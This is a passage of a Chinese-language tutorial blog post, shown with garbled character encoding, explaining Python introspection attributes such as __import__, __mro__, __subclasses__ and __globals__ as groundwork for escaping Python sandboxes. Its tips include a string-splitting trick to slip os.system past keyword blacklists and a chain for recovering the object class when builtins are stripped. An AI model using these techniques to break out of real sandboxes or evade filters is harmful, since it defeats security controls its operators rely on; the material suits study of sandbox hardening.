class="string">&#x27;subprocess&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(__builtins__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>æ¨¡å—å¯¹è±¡æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª<strong>å‘½åç©ºé—´å®¹å™¨</strong>ï¼Œå…¶ä¸­åŒ…å«è¯¥æ¨¡å—ä¸­å®šä¹‰çš„æ‰€æœ‰å†…å®¹ï¼Œå¦‚å‡½æ•°ã€å˜é‡ã€ç±»ç­‰ã€‚è¿™é‡Œçš„å‘½åç©ºé—´å®¹å™¨æ˜¯æŒ‡æ¨¡å—å¯¹è±¡ä¸­çš„ <code>__dict__</code> å±æ€§ï¼Œè®°å½•äº†è¯¥æ¨¡å—ä¸­å®šä¹‰çš„æ‰€æœ‰åå­—ä¸å¯¹è±¡çš„æ˜ å°„ã€‚</p>
</blockquote>
<p><code>__builtins__</code> æŒ‡å‘æ¨¡å— <code>builtins</code>ï¼Œè¯¥æ¨¡å—åŒ…å«äº†æ‰€æœ‰ Python çš„å†…ç½®å‡½æ•°ã€å¼‚å¸¸ã€åŸºæœ¬ç±»å‹ç­‰ï¼Œæä¾›å½“å‰ä½œç”¨åŸŸä¸­æ‰€æœ‰å†…ç½®å¯¹è±¡çš„è®¿é—®èƒ½åŠ›ã€‚åƒ <code>print()</code>ã€<code>len()</code>ã€<code>open()</code>ã€<code>Exception</code> ç­‰ï¼Œéƒ½æ˜¯ä» <code>__builtins__</code> æ¥çš„ï¼ˆä¾‹å¦‚ <code>__builtins__.print</code>ï¼‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BaseExceptionGroup&#x27;</span>, <span class="string">&#x27;BlockingIOError&#x27;</span>, <span class="string">&#x27;BrokenPipeError&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;ChildProcessError&#x27;</span>, <span class="string">&#x27;ConnectionAbortedError&#x27;</span>, <span class="string">&#x27;ConnectionError&#x27;</span>, <span class="string">&#x27;ConnectionRefusedError&#x27;</span>, <span class="string">&#x27;ConnectionResetError&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EncodingWarning&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;ExceptionGroup&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FileExistsError&#x27;</span>, <span class="string">&#x27;FileNotFoundError&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;InterruptedError&#x27;</span>, <span class="string">&#x27;IsADirectoryError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;ModuleNotFoundError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotADirectoryError&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;PermissionError&#x27;</span>, <span class="string">&#x27;ProcessLookupError&#x27;</span>, <span class="string">&#x27;RecursionError&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;ResourceWarning&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StopAsyncIteration&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span class="string">&#x27;SyntaxWarning&#x27;</span>, <span class="string">&#x27;SystemError&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>, <span class="string">&#x27;TabError&#x27;</span>, <span class="string">&#x27;TimeoutError&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;TypeError&#x27;</span>, <span class="string">&#x27;UnboundLocalError&#x27;</span>, <span class="string">&#x27;UnicodeDecodeError&#x27;</span>, <span class="string">&#x27;UnicodeEncodeError&#x27;</span>, <span class="string">&#x27;UnicodeError&#x27;</span>, <span class="string">&#x27;UnicodeTranslateError&#x27;</span>, <span class="string">&#x27;UnicodeWarning&#x27;</span>, <span class="string">&#x27;UserWarning&#x27;</span>, <span class="string">&#x27;ValueError&#x27;</span>, <span class="string">&#x27;Warning&#x27;</span>, <span class="string">&#x27;ZeroDivisionError&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;aiter&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;anext&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h3 id="import"><a href="#import" class="headerlink" title="__import__"></a><code>__import__</code></h3><p><code>__import__</code> æ˜¯ Python çš„ä¸€ä¸ª <strong>å†…ç½®å‡½æ•°ï¼ˆbuiltin functionï¼‰</strong>ï¼Œå®ƒç”±å†…ç½®æ¨¡å— <code>builtins</code> æä¾›ã€‚è¿™ä¸ªå‡½æ•°æ˜¯æ‰€æœ‰ <code>import xxx</code> è¯­å¥çš„åº•å±‚å®ç°æœºåˆ¶ã€‚ä½ å¯ä»¥ç”¨å®ƒåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°å¯¼å…¥æ¨¡å—ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>ç”±äº <code>__import__</code> å¯æ¥å— <strong>å­—ç¬¦ä¸²å‚æ•°</strong>ï¼Œå› æ­¤å¯ä»¥ç”¨äº <strong>ç»•è¿‡é™æ€å­—ç¬¦ä¸²è¿‡æ»¤</strong>ï¼ˆå¦‚é»‘åå•ï¼‰ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).system(<span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;lc&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p><code>__import__</code> è·å–çš„æ˜¯æ¨¡å—åç§°å¯¹åº”çš„ <strong>æ¨¡å—å¯¹è±¡ï¼ˆmodule objectï¼‰</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>))</span><br><span class="line">[<span class="string">&#x27;DirEntry&#x27;</span>, <span class="string">&#x27;F_OK&#x27;</span>, <span class="string">&#x27;MutableMapping&#x27;</span>, <span class="string">&#x27;O_APPEND&#x27;</span>, <span class="string">&#x27;O_BINARY&#x27;</span>, ..., <span class="string">&#x27;walk&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;writev&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h3 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h3><p><code>__dict__</code> æ˜¯ Python ä¸­çš„å¤§å¤šæ•°å¯¹è±¡ï¼ˆå¦‚æ¨¡å—ã€ç±»ã€å®ä¾‹ã€å‡½æ•°ç­‰ï¼‰è‡ªå¸¦çš„ä¸€ä¸ª<strong>å†…çœå±æ€§</strong>ï¼Œå®ƒä»¥å­—å…¸å½¢å¼ä¿å­˜äº†è¯¥å¯¹è±¡çš„<strong>å‘½åç©ºé—´ï¼ˆnamespaceï¼‰</strong>ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå¯¹è±¡æ‰€æ‹¥æœ‰çš„æ‰€æœ‰â€œ<strong>å¯å†™å±æ€§</strong>â€ã€‚</p>
<p>è¿™æ˜¯å¯¹è±¡çš„ä¸€ä¸ªå†…éƒ¨å±æ€§ï¼Œåº•å±‚å°±æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè®°å½•äº†å¯¹è±¡æœ‰å“ªäº›å±æ€§ï¼ˆåŒ…æ‹¬ä½ æ‰‹åŠ¨èµ‹å€¼çš„å˜é‡ã€å‡½æ•°ç­‰ï¼‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__ == <span class="built_in">globals</span>()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>

<h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><p><code>__class__</code> æ˜¯<strong>æ‰€æœ‰ Python å¯¹è±¡</strong>éƒ½æ‹¥æœ‰çš„ä¸€ä¸ªå±æ€§ï¼Œè¡¨ç¤ºè¯¥<strong>å¯¹è±¡çš„ç±»</strong>ï¼Œä¹Ÿå°±æ˜¯<strong>è¯¥å¯¹è±¡æ˜¯ç”±å“ªä¸ªç±»åˆ›å»ºçš„</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__class__.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><strong>ç±»</strong> æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ â€”â€” å®ƒæ˜¯ <code>type</code> ç±»çš„å®ä¾‹ã€‚æ‰€ä»¥å½“æˆ‘ä»¬è¯´â€œç±»å¯¹è±¡â€ï¼Œå°±æ˜¯æŒ‡ï¼š<strong>ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒæ˜¯é€šè¿‡ <code>type</code> ç±»æ„é€ å‡ºæ¥çš„ã€‚</strong></p>
</li>
<li><p><code>type</code> ç±»æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„ç±»è¿˜æ˜¯ <code>type</code>ï¼ˆæ˜¯è‡ªå·±åˆ›å»ºè‡ªå·±çš„ç±»ï¼‰ã€‚</p>
</li>
<li><p><code>builtins</code> æ¨¡å—ä¸­æä¾›äº†å¤§é‡ <strong><code>type</code> çš„å®ä¾‹</strong>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³æ—¶ä½¿ç”¨çš„ <strong>å†…ç½®ç±»å‹ï¼ˆç±»ï¼‰</strong>ï¼Œä¾‹å¦‚ <code>str</code>ï¼Œ<code>int</code> ç­‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__ == <span class="built_in">str</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div></li>
</ul>

    </div>
  </div>

<h3 id="bases"><a href="#bases" class="headerlink" title="__bases__"></a><code>__bases__</code></h3><p><code>__bases__</code> æ˜¯<strong>ç±»å¯¹è±¡</strong>ï¼ˆç±»å‹ä¸º <code>type</code> çš„å¯¹è±¡ï¼‰çš„ä¸€ä¸ªå±æ€§ï¼Œè¡¨ç¤ºè¯¥ç±»çš„<strong>ç›´æ¥çˆ¶ç±»</strong>ï¼ˆåŸºç±»ï¼‰ç»„æˆçš„<strong>å…ƒç»„</strong>ã€‚å¦å¤–ç±»å¯¹è±¡è¿˜æœ‰ä¸€ä¸ª <code>__base__</code> å±æ€§ï¼Œå®ƒè¿”å›çš„æ˜¯ <strong><code>__bases__</code> å…ƒç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ </strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__bases__</span><br><span class="line">()</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p>å› ä¸º <strong>Python æ”¯æŒå¤šé‡ç»§æ‰¿</strong>ï¼Œä¸€ä¸ªç±»å¯ä»¥æœ‰å¤šä¸ªçˆ¶ç±»ï¼Œæ‰€ä»¥<code>__bases__</code> è¿”å›çš„æ˜¯ä¸€ä¸ª <strong>å…ƒç»„</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(A, B): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(C.__bases__)</span><br><span class="line"><span class="comment"># è¾“å‡º: (&lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;)</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>æ‰€æœ‰ç±»æœ€ç»ˆéƒ½ç»§æ‰¿è‡ª <code>object</code>ï¼Œå› ä¸º <code>object</code> æ˜¯ <strong>æ‰€æœ‰æ–°å¼ç±»ï¼ˆPython 3 å…¨éƒ¨æ˜¯æ–°å¼ç±»ï¼‰</strong> çš„æ ¹åŸºç±»ã€‚è€Œ <code>object.__base__</code> è¿”å›ä¸€ä¸ªç©ºå…ƒç»„ <code>()</code>ï¼Œè¯´æ˜å®ƒæ²¡æœ‰åŸºç±»ã€‚</p>
</li>
<li></li>
</ul>

    </div>
  </div>

<h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h3><p><code>__mro__</code>ï¼ˆMethod Resolution Orderï¼‰æ˜¯<strong>ç±»å¯¹è±¡</strong>çš„ä¸€ä¸ª<strong>å±æ€§</strong>ï¼Œè¿”å›è¯¥ç±»çš„<strong>æ–¹æ³•è§£æé¡ºåº</strong>ï¼Œå³è°ƒç”¨æ–¹æ³•æ—¶æŒ‰ç…§å“ªäº›é¡ºåºæŸ¥æ‰¾ç±»ä¸­çš„æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>å½“æ²™ç®±æ¸…ç©ºäº† <code>__builtins__</code> ä¸­çš„å†…ç½®ç±»æ—¶ï¼ˆæ²¡æœ‰ <code>object</code> ç­‰å†…ç½®çš„ç±» ï¼‰ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>__mro__</code> æ¥è·å¾—ä¸€ä¸ª <code>object</code> ç±»ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a><code>__subclasses__()</code></h3><p><code>__subclasses__()</code> æ˜¯<strong>ç±»</strong>çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºè·å–è¯¥ç±»çš„<strong>æ‰€æœ‰ç›´æ¥å­ç±»</strong>ã€‚å®ƒè¿”å›ä¸€ä¸ª<strong>åˆ—è¡¨</strong>ï¼ŒåŒ…å«äº†å½“å‰è¿è¡Œç¯å¢ƒä¸­ï¼Œä»è¯¥ç±»<strong>ç›´æ¥ç»§æ‰¿</strong>çš„æ‰€æœ‰ç±»ï¼ˆå­ç±»å¯¹è±¡ï¼‰ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">A.__subclasses__()   <span class="comment"># âœ… [&lt;class &#x27;__main__.B&#x27;&gt;]</span></span><br><span class="line">B.__subclasses__()   <span class="comment"># âœ… [&lt;class &#x27;__main__.C&#x27;&gt;]</span></span><br><span class="line">C.__subclasses__()   <span class="comment"># âœ… []</span></span><br><span class="line">A().__subclasses__() <span class="comment"># âŒ AttributeErrorï¼šå®ä¾‹å¯¹è±¡æ²¡æœ‰è¿™ä¸ªæ–¹æ³•</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>å› ä¸ºæ‰€æœ‰çš„ç±»éƒ½æ‰€æœ‰ç±»æœ€ç»ˆéƒ½ç»§æ‰¿è‡ª <code>object</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆæ‰¾åˆ° <code>object</code> ç±»ï¼Œç„¶åå†é€šè¿‡ <code>object.__subclasses__()</code> æ‰¾åˆ°æ‰€éœ€çš„ç±»ã€‚ </p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2. è·å–å…¶æ‰€æœ‰å­ç±»</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h2 id="å‡½æ•°-æ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ"><a href="#å‡½æ•°-æ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ" class="headerlink" title="å‡½æ•° &#x2F; æ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ"></a>å‡½æ•° &#x2F; æ–¹æ³•çš„æ‰§è¡Œç¯å¢ƒ</h2><h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p><code>__globals__</code> æ˜¯ <strong>Python å‡½æ•°å¯¹è±¡</strong>ç‹¬æœ‰çš„ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼Œå®ƒæŒ‡å‘ä¸€ä¸ª<strong>å­—å…¸å¯¹è±¡</strong>ï¼Œå³è¯¥å‡½æ•°<strong>å®šä¹‰æ—¶æ‰€å¤„æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´</strong>ï¼ˆä¹Ÿå«å…¨å±€ä½œç”¨åŸŸï¼Œæˆ– module namespaceï¼‰ã€‚æ¢å¥è¯è¯´ï¼Œ**<code>__globals__</code> ç­‰ä»·äºå‡½æ•°å®šä¹‰æ‰€åœ¨æ¨¡å—çš„ <code>globals()</code> è¿”å›å€¼**ã€‚ä½ å¯ä»¥é€šè¿‡è¿™ä¸ªå±æ€§ï¼Œè®¿é—®å®šä¹‰å‡½æ•°æ—¶æ‰€åœ¨æ¨¡å—çš„æ‰€æœ‰å…¨å±€å˜é‡ï¼ŒåŒ…æ‹¬å¯¼å…¥çš„æ¨¡å—ã€å‡½æ•°ã€ç±»ã€å¸¸é‡ç­‰ã€‚</p>
<p><code>__globals__</code> æ˜¯æŒ‡<strong>å‡½æ•°å®šä¹‰æ—¶æ‰€åœ¨æ¨¡å—çš„ä½œç”¨åŸŸ</strong>ï¼Œåªå±äºå‡½æ•°å¯¹è±¡ï¼›è€Œ <code>__dict__</code> æ˜¯<strong>å¯¹è±¡è‡ªèº«çš„å‘½åç©ºé—´å­—å…¸</strong>ï¼Œé€‚ç”¨äºå¤§å¤šæ•°å¯¹è±¡ï¼ˆæ¨¡å—ã€ç±»ã€å®ä¾‹ã€å‡½æ•°ç­‰ï¼‰ã€‚å…¶ä¸­<strong>æ¨¡å—çš„ <code>__dict__</code></strong> ç­‰äº<strong>æ¨¡å—ä¸­å®šä¹‰çš„å‡½æ•°çš„ <code>__globals__</code></strong> ç­‰äº<strong>åœ¨æ¨¡å—ä¸­è°ƒç”¨ <code>globals()</code> å‡½æ•°çš„è¿”å›ç»“æœ</strong>ã€‚</p>
